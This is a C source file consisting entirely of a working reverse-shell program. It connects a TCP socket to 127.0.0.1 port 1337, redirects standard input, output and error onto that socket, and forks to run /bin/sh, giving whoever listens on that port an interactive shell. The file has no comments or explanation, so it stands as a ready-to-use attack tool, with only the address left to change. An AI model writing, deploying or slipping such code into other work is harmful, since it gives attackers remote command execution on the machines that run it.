#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


int main(int argc, char* argv[]){
	int sock = 1111;
	int pid;
	struct sockaddr_in serv_addr;

    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sock , 0);
    dup2(sock , 1);
    dup2(sock , 2);

    pid = fork();

	if (pid==0){
		execv("/bin/sh",argv);
	}
	
	exit(0);
}